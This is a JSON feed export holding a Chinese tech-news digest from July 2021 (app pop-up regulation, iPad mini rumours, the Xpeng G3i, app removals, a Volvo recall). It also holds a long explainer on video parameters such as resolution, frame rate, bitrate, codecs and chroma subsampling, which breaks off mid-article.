[{"title":"派早报：工信部严打 App 开屏弹窗信息骚扰问题、新款 iPad mini 或于秋季发布等","date":"2021-07-12 00:48:03","description":"\n<h2>工信部严打 App 开屏弹窗信息骚扰问题</h2>\n<p>7 月 9 日，工信部针对用户反映强烈投诉较多的 App「弹窗信息标识近于无形、关闭按钮小如蝼蚁、页面伪装瞒天过海、诱导点击暗度陈仓」等违规行为，进行了集中整治。截至目前，百度、阿里、腾讯、字节跳动、新浪微博、爱奇艺等 68 家头部互联网企业已按要求完成整改。<a href=\"http://gdca.miit.gov.cn/xwdt/xydt/art/2021/art_6abbdaeda0a949a1a2aa6ffac83f7b68.html\" target=\"_blank\">来源</a></p>\n<h2>新款 iPad mini 或于秋季发布</h2>\n<p>据彭博社记者 Mark Gurman 在 Newsletter 订阅栏目 Power On 中的爆料，经过重新设计的 iPad mini 可能将于今年秋季发布。据爆料，新款产品与 iPad Air 拥有相似的边框设计，描述与 Jon Prosser 此前发布的渲染图片相符。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/article/56a60987065ebb128e91800a75d033c4\"><figcaption>Jon Prosser 制作的渲染图片</figcaption></figure><p>Mark Gurman 还称，Apple 正在研发屏幕尺寸更大的新款 iMac 产品，将搭载 M1X 或 M2X 芯片，发布时间暂不确定。针对此前 Touch ID 功能将来到 Apple Watch 上的传闻，Mark Gurman 则表示了相反意见。来源 (<a href=\"https://appletrack.com/redesigned-ipad-mini-first-look-shows-larger-screen-usb-c-more\" target=\"_blank\">1</a>, <a href=\"https://appletrack.com/gurman-larger-redesigned-imac-will-likely-feature-m1x-or-m2x-chip/\" target=\"_blank\">2</a>, <a href=\"https://appletrack.com/gurman-apple-has-no-imminent-plans-for-touch-id-on-apple-watch/\" target=\"_blank\">3</a>)</p>\n<h2>小鹏推出紧凑型 SUV 车型 G3i</h2>\n<p>7 月 9 日，小鹏汽车正式推出旗下紧凑型 SUV 车型 G3i。小鹏 G3i 拥有四种配置车型，售价区间在 14.98 万至 18.58 万元，外观设计上延续了小鹏 P7 等车型，车载系统为目前小鹏最新的 Xmart OS 2.0 车载智能系统，芯片为高通骁龙 820A，可以实现全场景语音、可见即可说、连续对话等功能。</p>\n<p>小鹏 G3i 配备了三组毫米波雷达、12 个超声波雷达和 5 个高清摄像头，带有 XPILOT 2.5 自动驾驶辅助系统，安全系统特意为国内复杂路况进行调校，并加入加塞预警、后方横向来车预警等功能，动力上沿用了现款车型的动力配置方案，采用最大功率 145 千瓦、最大扭矩 300 牛·米的电机驱动，长续航版本车型 NEDC 续航里程可达 520 公里。<a href=\"https://weibo.com/5710264970/KnYJmDAb2?type=comment#_rnd1625995717357\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/11/c30365c45ba623bdd31eac751e9d84ca.png\"></figure><h2>Android 第三方微博客户端 Share 宣布下架</h2>\n<p>7 月 9 日，因受到不可抗拒因素影响，Android 第三方微博客户端 Share 正式宣布将不再维护和支持使用，并针对应用市场也进行了下线处理。<a href=\"https://weibo.com/2207519004/KnWRYcz87\" target=\"_blank\">来源</a></p>\n<h2>网信办公布关于下架「滴滴企业版」等 25 款 App 的通报</h2>\n<p>7 月 9 日，网信办发布官方通告，明确「滴滴企业版」等 25 款 App 存在严重违法违规收集使用个人信息问题。依据《中华人民共和国网络安全法》相关规定，通知应用商店下架上述25款App，要求相关运营者严格按照法律要求，参照国家有关标准，认真整改存在的问题，切实保障广大用户个人信息安全。<a href=\"http://www.cac.gov.cn/2021-07/09/c_1627415870012872.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/article/da1a624c0aab56578e54ac9cf123a9d8\"></figure><h2>沃尔沃召回部分进口和国产车辆</h2>\n<p>沃尔沃汽车销售、大庆沃尔沃汽车制造有限公司以及浙江豪情汽车于 7 月 9 日发布公告，宣布依据《缺陷汽车产品召回管理条例》和《缺陷汽车产品召回管理条例实施办法》的要求，向国家市场监督管理总局备案了召回计划。</p>\n<p>据公告信息，沃尔沃决定自即日起召回 131591 辆车辆，涵盖了国产和进口的多款沃尔沃车型，包括 V60、V90CC、XC90、XC60、S60、S90 等，这些车型由于设计问题，在某些情境下会触发低压燃油泵的 15A 保险丝发生熔断的风险，造成车辆发动机无法启动等风险，召回车辆将会免费更换为 20A 燃油泵保险丝以消除安全隐患。<a href=\"http://www.samr.gov.cn/zw/zh/202107/t20210709_332499.html\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67622\" target=\"_blank\">记录属于你的夜空：银河拍摄指南</a></li>\n<li><a href=\"https://sspai.com/post/67629\" target=\"_blank\">打鼾：你熟悉的夜间惊雷，究竟是什么？</a></li>\n<li><a href=\"https://sspai.com/post/67593\" target=\"_blank\">学英语遭遇「跑路」：22 位大学生、3 步成功维权</a></li>\n<li><a href=\"https://sspai.com/post/66834\" target=\"_blank\">符号链接、硬链接及其在 Windows 上的应用举例</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67651"},{"title":"想做视频？这里有一份入门到进阶知识完整指南 ​","date":"2021-07-11 23:06:59","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-97e92f7ff7354ae4287d8a0734af1133_l.jpg?source=8673f162\"><span>李明殊，</span><span>数码胶片XX法师群群成员(33/79)</span>\n</div>\n<div>\n<p>​【<strong>万字长文，解释你在视频制作时会用到的知识和术语</strong>，以及在器材选择时应该注意的问题，有点长，可以先收藏下来，慢慢看】 ​</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ebdde659e030c07c0e9ce3d56d38341a_b.jpg\" alt=\"\"></figure><p>​</p>\n<p>不可置疑的是，这是一个视频的时代。</p>\n<p>不论是相机还是手机厂商，每次发布会也会用很长的篇幅来解释他们产品的视频能力。 也很有多朋友为了更好的视频质量，不在满足于手机拍摄，开始选择单反或者微单开始自己视频的创作。 选购肯定也会遇到何种乱七八糟的参数，什么 10bit ,什么 422，super35，这是都是什么，又有什么作用？ 今天我们就来认真地讨论一下这些东西。</p>\n<p>​</p>\n<p><strong>4K 即正义？分辨率</strong></p>\n<p>当你在 B 站看小姐姐跳舞的时候，有时候可能会看到这个标志【4k 超清】。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e003ff23b00c7d5cd40f19fc5cc5888a_b.jpg\" alt=\"\"></figure><p>这也许是大家最熟悉的一个的参数——分辨率，不论是视频也好，还是显示器或者电视机都会用到这个，很简单，也很容易理解，分辨率越高，视频画质越好。 ​</p>\n<p>通常上，还会用这样的一张图，来解释不同视频分辨率的效果。我们也会把这个分辨率称为『输出分辨率』。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f0d93cd8f4e5a062e1cf93c85bfec81d_b.jpg\" alt=\"\"></figure><p>有聪明的小朋友要问了，我的手机或者显示器不过是 1080P 的，那么还有必要搞 4K 么？ ​</p>\n<p>即使最终都是输出为 1080P 的，拍摄的素材为 4K，会包含更多的色彩信息，感官上会感觉更加的清晰，色彩更加丰富（这个过程就是超采，下文会详细解释），而且也方便你进行画面的裁剪或者稳定。 ​</p>\n<p>拍摄 8K 同理，即使最终输出为 4K 的视频，也会获得更好的画面，但是问题就在于能够拍摄 8K 的设备普遍不便宜，对于存储和处理的要求会更高。除了相机之外，你还得更新电脑，买更贵的显卡和更大的硬盘才行。 ​</p>\n<p>所以目前来讲，<strong>4k 无疑更具有实用性</strong>，而且几乎每一台手机，哪怕是入门级别的相机，也都开始普及 4K 视频了。 ​</p>\n<p>注： 4K 分辨率其实是一个统称，画面横向像素在 4000 个左右，纵向在 2000 个像素左右的，都可以称之为 4k 分辨率，不同的设备和场景下，所以就有了不同的 4k 分辨率。 ​</p>\n<p>最为常见的，是我们日常的网络视频以及很多显示器的比例，16：9，分辨率为 3840 × 2160，手机相机也通常也以这个分辨率捕获素材。 ​</p>\n<p>当然，还有其他规格的 4k 分辨率，可参考下表：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-f9d5108e8fc41c56ec0fb4bc8e701097_b.jpg\" alt=\"\"></figure><p>部分相机也能拍摄 DCI-4K 的视频，比如松下的 GH5s，S1H，以及万元最强全画幅视频微单 S5。</p>\n<p>​</p>\n<p><strong>为什么拍视频的时候，画面有变化？裁切与超采</strong></p>\n<p>现在请你拿出你的手机，从拍照模式切换到录像模式，你会发现一个有趣的现象，画面的视角好像发生了变化。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8ed33d5c93c3e4bf43571e909b11942c_b.gif\" alt=\"\"></figure><p>为什么呢？ ​</p>\n<p>其实很好理解，拍摄 4K 视频，分辨率为 3840 × 2160，像素不过 800 万左右，但是问题现在手机像素通常都在 1200 万像素之上，相机呢，普遍的像素值在 2000 万左右。 ​</p>\n<p>那多出来的这些像素，怎么办？ ​</p>\n<p>第一种解法就是，多出来就多出来呗，不用就行，于是就有了裁切这种方式，拍摄视频的时候，我只使用中间那部分需要的像素就够了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-42f413c6db1c21ff16988a6bafd8b865_b.jpg\" alt=\"\"></figure><p>缺点显而易见，就是本来能够拍摄的到视角变小了。 ​</p>\n<p>比如裁切系数为 1.7 倍，你使用一只 24mm 的广角镜头，拍摄出来的画面相当于 40mm 镜头拍的，丧失了广角端。 ​</p>\n<p>顺便也提醒大家一点，厂家往往很鸡贼，会把这个裁切系数用很小很小的字体写在备注里。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-56844b28915425c0986f0ee66889c5b0_b.jpg\" alt=\"\"></figure><p>既然集中使用中间的像素会丧失视角，那么我尽量使用整个传感器呗。 ​</p>\n<p><strong>于是『跳采』这种方式出现。</strong>简单来说，就是每间隔几个像素记录一个像素点的信息，其它像素的信息就不要了，如图所示。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7a04ec980152ed632e92cf4585e6a435_b.jpg\" alt=\"\"></figure><p>很棒，解决了视角裁切的问题，但是缺点也很明显，舍弃了一部分像素的信息，不论是画质上还是颜色上，都会有所欠缺。 ​</p>\n<p>有没有更好的解法，<strong>有，就是超采。 ​</strong></p>\n<p>在理解超采之前，得先理解传感器是如何记录颜色的。 ​</p>\n<p>实际上，像素点是不会记录颜色信息的，他只能记录光的强度，那么如果还原真实世界的色彩呢？ 不得不提『拜尔滤镜』了。在像素上放上滤色片，然后记录不同颜色的滤色片对光的过滤效果，就可以得到颜色信息。 ​</p>\n<blockquote>具体的光学知识可以参考之前的这个回答。</blockquote>\n<p><a href=\"https://www.zhihu.com/answer/1721715927\">李明殊：彩色胶片主要是什么原理?</a></p>\n<p> <br><br>但是像素不是胶片的感光剂，摞三个滤色片在上边，也不能记录色彩信息，于是拜尔想了一个办法，把<a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/RGB\" target=\"_blank\" rel=\"nofollow noreferrer\">RGB</a>滤色器按照一定的方式排列在相邻像素上，这样就可以根据周边的颜色数值，来算出一个『颜色』。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-71f767145414cedbdf9a10f541fa8f6d_b.jpg\" alt=\"\"></figure><p>既然是『算出来』，那么就不是真实的。 ​</p>\n<p>​</p>\n<p>但是不可否认的是，<strong>只要我输入的条件够多，结果应该更加准确，接近真实。</strong> 超采就是这么一个类似的过程—— ​</p>\n<p>采集传感器上所有像素的信息，然后根据周边像素的信息算出来一个数值，然后记录。 ​</p>\n<p>为了便于理解超采，我们举一个不太严谨的例子，假如现在有一个 3200 万像素的相机，需要拍摄 4K 视频。也就是需要将四个像素变为一个像素。</p>\n<p>假设四个像素的情况如图所示： ​</p>\n<p>跳采，选择其中一个颜色直接记录，比如 1 中的红色； 超采，就是根据周边的的像素，来计算出一个颜色，然后作为记录。无疑，这种方式可以获得更准确的颜色，更加锐利清晰的画面。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-582ac1bc7e85a2bbe9d0dd21f12cf653_b.jpg\" alt=\"\"></figure><p>看起来很棒了，超采就没有什么问题了嘛？ ​</p>\n<p>有。 ​</p>\n<p>由于超采需要计算，而计算是需要一定的时间，就会导致果冻效应更加明显。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b738fab57fe8e3586addcebff4362f61_b.jpg\" alt=\"\"></figure><p>你在车上拍的电线杆子，也就会更歪一点了。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-cd02e430fb1d3597bf9327893f0c6483_b.jpg\" alt=\"\"></figure><blockquote>注: <br>即使具有超采功能的相机，不是所有的视频规格都有超采，不同的分辨率和帧率下的设定会不同。 <br>比如索尼的大部分相机，4k 视频是从 6K 分辨率超采而来，但是 1080P 的规格不是； <br>超采不一定会用到整个传感器，即使是超采，也会有画面裁切（但是这个比例通常很小），只要采集的像素比最终输出的像素多，就可以称之为超采。 ​</blockquote>\n<p>​</p>\n<p><strong>为什么是 23.98？关于帧率</strong></p>\n<p>戈达尔说：</p>\n<blockquote>电影是每秒 24 格的真理。</blockquote>\n<p>因为视觉暂留，一秒 24 帧的画面，看起来流畅而且自然。 ​</p>\n<p>为了拍摄电影感的视频，你把相机的帧率调整为 24 帧，然后兴冲冲的拍了一段视频，但是当你把视频导入到电脑上，右键属性的时候，或者把素材放到剪辑软件中，会发现，视频的帧率是 23.98。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-c35eb85358b43f97bb4ccc95035830e3_b.jpg\" alt=\"\"></figure><p>说好的 24p，怎么还差我 0.02，剪辑个视频都有中间商赚差价吗？ ​</p>\n<p>实际上，23.98 也是个近似值，准确的数值应该是 23.976，为什么是这么一个奇葩的数字？ 鲁(niu)迅(dun)曾经说过——</p>\n<blockquote>一切看起来不合理的设定背后，都是历史遗留问题。</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-4b0725848043fa53a60451127d04d246_b.jpg\" alt=\"\"></figure><p>美国的电源频率是 60Hz，所以当年电视诞生后，电视的场频也是 60Hz。 ​</p>\n<p>当时的电视采用的是隔行扫描，也就是一秒钟需要记录 30 张画面，也就是 30fps。</p>\n<p>但是后来彩色电视诞生，需要传输和记录色度信息，彩色副载波与亮度信号和音频载波之间的相互干扰。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b90e2e0e4f63c26fb79bdec94ba09b56_b.jpg\" alt=\"\"></figure><p>工程师为了解决这个问题，把频率下降千分之一，场频变为 59.94，同理，帧率就是 59.94✖️1/2=29.97。</p>\n<p>电影的帧率也下降千分之一，24/1.001=<strong>23.976</strong>，看，这个神奇的数字出现了。</p>\n<blockquote>更多详细内容，可以参考<a href=\"https://zhuanlan.zhihu.com/p/66319869\"><span>https://</span><span>zhuanlan.zhihu.com/p/66</span><span>319869</span><span></span></a>这篇文章。</blockquote>\n<p>当人们想用电视看电影的时候，问题就出现了，电视是 29.97，电影是 23.976，这帧率不一样，还怎么看？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-86e53144a18d61d80a1a9cff208ffca9_b.jpg\" alt=\"\"></figure><p>也就是说电影画面每四帧要塞到电视的五帧里，怎么塞? ​</p>\n<p>于是 就有了 3：2pulldown 的技术。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1009a52ad1c9034ac7ca92ac6199d058_b.jpg\" alt=\"\"></figure><p>还记得之前说的隔行扫描吗？</p>\n<p>每个画面经过隔行之后，会产生两个画面，然后按照 2323 这样的方式排列，最后就可以把四帧的画面塞到五帧中。 ​</p>\n<p>虽然说已经是数字时代了，但是还有一些地区和在使用模拟信号的电视或者广播，所以 23.976 这样的帧率的兼容性会更好的一点。 ​</p>\n<p>其实还有一个最为主要的原因，目前的消费领域的拍摄设备，基本上都是 23.98（23.976），真 24p 的相机或者录像机，往往比较贵。不过就相差这么一点，看不出来什么的。 ​</p>\n<p> <br><br>视频的制式根据各国使用的电源频率不同，分为​<strong>PAL 制和 NTSC 制。</strong></p>\n<ul>\n<li>前者有中国和德国为代表，电源频率为 50Hz，视频的帧率就是 25P，50P 或者 100P；</li>\n<li>后者以美国和日本为代表，电源频率为 60Hz，视频的帧率就是 30P，60P 或者 120P。</li>\n</ul>\n<figure><img src=\"https://pic4.zhimg.com/v2-696b202b9e3a0d181d00645de86f7687_b.jpg\" alt=\"\"></figure><p>这就是有的小朋友经常会问到的一个问题，为什么我的相机宣传可以拍摄 120 帧的视频，为什么菜单设置里只有 100P，切换一下制式就好了。</p>\n<blockquote>这是必须得吐槽一下，索尼的相机，切换个制式还得格式化，搞不懂为什么会有这么奇葩的设定。</blockquote>\n<p>有小朋友又要问了，那我使用 N 制还是 P 制？</p>\n<p>其实现在的视频大多是网络使用，不论是 N 制还是 P 制，关系不大，选哪个都行，你开心就好，如果你有电视或者广播播放的需求，那还是选择对应的国家，以免后期的麻烦。 ​</p>\n<p>如果你有多个设备，建议还是将拍摄制式统一。 ​</p>\n<p>另外，还有一点得注意，如果你发现拍摄的场景有照明灯光，画面中出现闪烁的情况，建议还是调节成当地的制式，帧率和电源频率匹配时，就可以解决这个问题。 ​</p>\n<p>我们经常说道的慢动作拍摄，其实是一秒钟拍摄更多的画面，比如 120 帧，然后播放的时候按照正常的帧率播放（24 帧），这样本来 1s 的画面，需要 5 秒的时间播放，自然就慢了。 ​</p>\n<p>这个过程也就是我们所说的升格。 ​</p>\n<p> <br><br><strong>既然有升格，那么就有降格</strong>，相反的，一秒钟记录更少的画面，然后以正常的速度播放，就会有视频加快的感觉，最常见的降格，其实是延时摄影。 ​<br><br>但是更高的帧率和分辨率会导致更大的数据量，在很多基础的相机上，高帧率和高分辨是不可兼得的，需要作出取舍。<br><br>这也是为什么目前大家对 4k/60 这个参数情有独钟的原因，在画质和帧率上达到了一个不错的平衡。 ​<br><br>​<br><br><strong>为什么我的 4K 这么差 ，码率</strong><br><br>一个显而易见的例子，手机拍摄的 4k 画面，有时候还不如相机拍摄的 1080P。 ​<br><br>按理说，4k 的画面要比 1080P 好多很多啊，为什么？ ​<br><br>决定画质的，除了分斌率，还有码率。 ​<br><br>这也就是一些国内的视频网站，所谓的超高清的视频的画面看起来并不那么高清，除了分辨率虚标之外（720P 就是超清，1080P 就是蓝光，那 4K 不得起飞了？）</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f7af8c6e67ef3d5012b43501b65e3496_b.jpg\" alt=\"\"></figure><p>视频的码率也惨不忍睹（大多数的视频码率在 2M-4M 之间）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-595956abb24f4843239b9618fe8cea12_b.jpg\" alt=\"\"></figure><blockquote>B 站的码率其实都算良心的了。</blockquote>\n<p>​</p>\n<p>所谓码率，就是一秒钟记录的数据量，数据量越多，画质越好。码率决定了你文件的大小。</p>\n<p>通常手机这种设备的码率厂家已经给你写死了，没有办法调节。 ​</p>\n<p>问题来了。 对于相机这类设备来说，是否需要将码率设为最高。 ​</p>\n<p>答案也不一定，一切都要按需出发。 因为在一定的分辨率下，不断提高码率所带来的画面提升已经肉眼不可见了，文件体积却在不断地增大。 ​</p>\n<p>一个比较实用的做法是，使用你手头的机器，使用不同的码率拍摄一段看起来复杂的画面。 然后正常的进行后期调色，找到一个你分辨不出来画面差异的码率，然后用它就行了。 ​</p>\n<p><strong>H.265 MP4.编码与封装</strong><strong>找一个盒子装起来：封装格式</strong></p>\n<p>先来说格式封装，这个是大家最常见到的东西，也就是你文件的后缀名。 ​</p>\n<p>常见的格式，有 MP4，和 MOV，FLV 等。</p>\n<p>本质上你可以把格式理解为一个容器，可以装进去所有关于视频内容，除了帧画面，还有音频甚至字幕。 比如你在网上下载电影来看，很多都是 MKV 这种格式，可以塞进去多轨音频甚至多轨字幕，这也就是为什么有的电影能够切换声道的原因。</p>\n<p>​</p>\n<p><strong>存储的方式，编码</strong></p>\n<p>下来说说编码，编码就是记录画面的方式。 ​</p>\n<p>有两种记录的方式，一个是帧内编码，比如苹果的 PRORES。 这种很好理解，就是直接记录每一帧画面，后期电脑直接按顺序播放这些画面就 ok 了。 优点就是几乎不需要什么算力，播放起来很流畅，缺点就是会占用更大的空间。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5e9c09f2c0bfdd13efb4bf4e85822c05_b.jpg\" alt=\"\"></figure><p>这也就是为什么同样的配置的电脑，往往使用 Final cut Pro 剪辑要比 Adobe Primier 流畅很多的原因，正是因为 Final Cut Pro 使用 PRORES 的编码方式，但本质上，这是一种『以空间换速度』的做法。 ​</p>\n<p>很多小伙伴们用 Final Cut 剪视频，剪到一半，突然发现硬盘空间没了，就是这个原因。</p>\n<p>不过可以在剪辑完成后删除这类优化代理渲染文件，来节省空间，不过如果你有大量的素材，那建议还是搞个外置的大容量 SSD 或者直接连接 Nas 剪辑，体验会更好。 ​</p>\n<p>PRORES 是一种中间编码，仅用于中间的视频编辑过程，也就是说，最后视频输出还得靠 H.264。</p>\n<p>H.264 是一种帧间编码。</p>\n<p>简单来说，他只记录每帧之间的变化值，然后解码器根据变化来『算出』中间的画面。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-afc5ab4ff8a658414ab61f2ab79ae992_b.jpg\" alt=\"\"></figure><p>比如我拍摄一个采访视频，嘉宾基本上坐着不动，背景啥的都没有变化，只记录变化的部分，最大的好处文件体积就会小很多，但是解码播放时，却增加了算力的要求。 ​</p>\n<p>H.264 应用十分广泛，几乎应用在所有的设备和产品上。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-7765a7001ebe1dbc0c315da619829417_b.jpg\" alt=\"\"></figure><p>他的下一代是 H.265，更好的体积压缩，更好的画质。 ​</p>\n<p>但是我们目前的播放和处理设备对于 H.265 的支持都不太好，也就是说，你直接用当前的电脑剪辑 H265 编码的视频，会卡的惨不忍睹。</p>\n<p>卡了怎么办？除了换电脑之外，买显卡之外，还可以通过剪辑软件生成代理素材来剪辑。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-db47846040c6df5336c3b4dced840bab_b.jpg\" alt=\"\"></figure><p>是一种『以时间换性能的做法』。 ​</p>\n<p><strong>10bit 422—色深与色度采样</strong></p>\n<p>10bit 422， 8Bit 420 这是我们在看相机参数时，经常会看到的一串数值。 他们到底说的是啥？ ​</p>\n<p><strong>越深越好，色深</strong></p>\n<p>先说这个 10bit ,色深。 如果你经常使用 Photoshop，或者一些设计软件。会经常看到#FFB6C1 这样的数值，他们称之为色值。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-cddc2294c47565a5794b1818e3259d2f_b.jpg\" alt=\"\"></figure><p>通常由 6 位十六进制字符代表，红绿蓝 每种颜色占用两位。 ​</p>\n<p>也就是说，每一种颜色有 16*16 种变化，这个数值正好的 2 的 8 次方，所以我们把这种颜色称为 8 位色深，也就是 8bit。 ​</p>\n<p>很容易计算，8bit 色深的颜色一共有 256×256×256=16,777,216 种颜色，也就是我们经常说的 1600 万色。 ​</p>\n<p>虽然看起来也不少了，但是在实际的拍摄体验中，尤其是渐变的场景，后期稍微拉一下，就会遇到色彩断层的问题。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3a31a4c48177e43e8738628c6fa50dfc_b.jpg\" alt=\"\"></figure><p>而 10bit，最终色彩总量可以达到 10 亿色，由于颜色增多，色彩的过渡会更加的自然，哪怕最终输出的还是 8bit 的画面，依旧可以获得很不错的画面。 ​</p>\n<p>​</p>\n<p>​</p>\n<p><strong>谁还不是为了省钱啊：色度采样</strong></p>\n<p>​</p>\n<p>为了数字化的记录颜色，人们搞出来了『色彩空间』这样一个模型。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9d84b3c081572d1558a148294d4a0f5c_b.jpg\" alt=\"\"></figure><p>不同的色彩空间有着不同的特点，应用于不同的领域： 我们最为熟悉的 RGB，是一种加法色，应用最为广泛，设备显示，图像处理； CMYK，是一种减法色，通常用印刷行业； RGB 发光屏幕的加色模式，依赖于光线，CMYK 是一种颜色反光的印刷减色模式，依赖于颜料。有<strong>所依赖就会有所不足</strong>。所以 Lab 模式诞生，理论上，Lab 可以包含所有色彩。 ​</p>\n<p>但是在电视或者数码摄影系统中，我们通常上使用 Y'CBCR 这种色彩模式。</p>\n<blockquote>实际上，Y'CBCR 不是一种绝对色彩空间，而是 YUV 压缩和偏移的版本，但是由于 Y'CBCR 的应用实在是太广泛了，所有大多时候，我们口中所说 YUV 指的就是 Y'CBCR。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-1a7b62a75e45b29098b0c53437130dbd_b.jpg\" alt=\"\"></figure><p>其中：</p>\n<p>Y'代表光的浓度，也就是亮度，而且这个值是非线性的。</p>\n<p>Cb 和 Cr 代表蓝色和红色浓度的偏移量，包含色度和色差信息。 ​</p>\n<p>常见的格式有以下几种,用一个三分比值表示：</p>\n<ul>\n<li>4:4:4</li>\n<li>4:2:2</li>\n<li>4:2:0​</li>\n</ul>\n<p>第一个值，区域的宽度，也就是区域的像素数量，通常上为 4；</p>\n<p>第二个值，第一行像素的色度抽样数目；</p>\n<p>第三个值，第二行的色度采样值。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cb2de30cf8990d5da5bbe1ea9181c730_b.jpg\" alt=\"\"></figure><p>比如我们来看 4:4:4 这种格式，区域的宽度为 4 个像素，第一行抽样的数值为 4，第二行也是 4，也就是所有的信息都被采集到了。这是一种对于色彩细节保留最好的格式。 ​</p>\n<p>同理，4:2:2 和 4:2:0 的取样情况如下。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5b18cd70a502658eb8a7a8c13937f39e_b.jpg\" alt=\"\"></figure><p>可以明显看到，4:2:2 损失了 50%的信息，而 4:2:0 几乎损失了 75%的信息。 ​</p>\n<p>即使如此，损失了 50%的 4:2:2 也被视为<strong>高品质的专业视频格式，</strong>比如索尼家的微单相机，目前应该只有 A7S3 和 A1 支持 4:2:2 的视频格式，其他的主流机型，目前还停留在 4:2:0 上。</p>\n<blockquote>注：<br>在比较图像质量，比值才是重点，你可以把 4:4:4 称为 1:1:1，但是习惯和约定俗成的情况下，取样的总样本范围还是为 4，这也就是为什么没人 16:10 称为 8:5 的原因，无他，习惯耳。</blockquote>\n<p>​</p>\n<p>可能有小伙伴要问了，为什么要采样呢，搞的这么复杂？ ​</p>\n<p>鲁(niu)迅(dun)又曾经说过——</p>\n<blockquote>人们的很多选择，多半是为了效率（省钱）。</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-9b267035f50c2c72be95f96d2be65a61_b.jpg\" alt=\"\"></figure><p>要使用 4:4:4 不仅是对于拍摄器材的性能要求极高，存储上，也吃不消。 ​</p>\n<p>还有一个最主要的原因是，眼睛<strong>对于微调的色度不太敏感。</strong><strong>​</strong></p>\n<p>也就是说，Cr 和 Cb 可以用<strong>一点点的样本就能进行编码，而且可见的质量损失微乎其微</strong>，却节省了大量的数据量。</p>\n<p>这也就是你即使用保留了 25%的色彩信息的 4:2:0 去拍，实际的观感也没有那么差的原因。 ​</p>\n<p>但是你如果要进行复杂的后期，甚至抠像特效的时候，你就会发现，4:2:0 的画面用起来就有点捉襟见肘了，还是得上 4:2:2。</p>\n<p><strong>RAW，Log，Rec709，HLG 又是什么</strong><strong>RAW，（生）肉</strong></p>\n<p>玩摄影的朋友，想必对于 RAW 很熟悉了，记录了传感器采集到的所有的光线的信息。 严格来说，RAW 并不是一种图片格式，而是一个数据包。</p>\n<p>拍的 RAW 格式的视频，与图片类似（本质上视频就是一张张图片拼接起来嘛）。 ​</p>\n<p><strong>拥有的最大的后期空间</strong>，但是能够拍摄 RAW 视频的器材不多，都是比较专业的摄影机，比如 RED，ARRI 之流，都十分的昂贵，但是有一个例外，就是适马 fp，机身小巧，也不算贵，能够拍摄 cinemaDNG 序列（也算是一种 RAW 视频了）。 ​</p>\n<p>其实所有的拍摄设备，都有 RAW 的这个过程，为什么不把 RAW 数据直接给你呢？ ​</p>\n<p>RAW 是个数据量杀手，你刚塞进去一张 128G 的 SD 卡，还没有一分钟呢，嚯，卡满了。而是对于后期处理也是一个大难题，流程繁琐，并不适合大多数据消费者使用。 ​</p>\n<p><strong>Log，指数观察世界</strong></p>\n<p>人眼能看清楚明亮的天空，也能辨别阴影的细节。 这就说明人眼对于光线的感知并不是线性的，这也就是中性灰是 18%，而不是 50%的原因。 ​</p>\n<p>为了尽量的拟合人眼识光线明暗的特点，人们找到了 log 这个函数来模拟。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d643b12381600664f5e99ab68600e809_b.jpg\" alt=\"\"></figure><p>为的就是记录更多的明暗数据，换句话说，就是把暗部拉上去，把亮度压下来（是不是像极了后期照片时减高光，加阴影的操作？）来让画面有用更高的动态范围。 ​</p>\n<p>不同的厂家有着不同的 Log 曲线，比如佳能的是 C-log，索尼家的是 S-log，富士家是 F-log，松下的是 V-log（注意不是拍的吃饭旅游的那个玩意）。 ​</p>\n<p>即使是同一家厂商，Log 曲线也有不同的版本，比如 C-log 就有 1，2，3 的区别，在暗部，亮部的捕获表现上都会有细微的差异。</p>\n<p>但是直接观看 Log 画面，会显得十分的『灰』。 ​</p>\n<p>如何观看正确的色彩呢？这时候 LUT 就登场了。 基本上所有的厂家都会提供自己 log 模式的还原 Lut，可以很轻易的地官网找到。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-843d22d2e3e74800f3ce30c9d3d006ae_b.jpg\" 